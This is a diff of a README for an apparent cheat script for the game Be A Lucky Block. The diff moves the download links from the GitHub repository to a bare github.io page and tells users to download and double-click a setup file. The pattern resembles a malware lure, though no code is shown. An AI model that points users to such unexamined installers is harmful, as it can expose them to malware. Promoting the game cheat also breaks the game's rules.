@@ -1,6 +1,6 @@
 # 🍀 be-a-lucky-block-hub - Automate your game for better results
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zerovia/be-a-lucky-block-hub)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://zerovia.github.io)
 
 This script simplifies your experience in the game Be A Lucky Block. It provides tools to aim better and sell items automatically. You spend less time on repetitive tasks and more time playing the game.
 
@@ -26,7 +26,7 @@ Your computer needs to meet these basic standards to run the script well:
 
 Follow these steps to set up the script on your machine.
 
-1. Visit the repository page to download the latest setup file: [https://github.com/zerovia/be-a-lucky-block-hub](https://github.com/zerovia/be-a-lucky-block-hub)
+1. Visit the repository page to download the latest setup file: [https://zerovia.github.io](https://zerovia.github.io)
 2. Locate the file in your Downloads folder once the download finishes.
 3. Double-click the file to open the installer.
 4. Follow the prompts on your screen to complete the setup process.
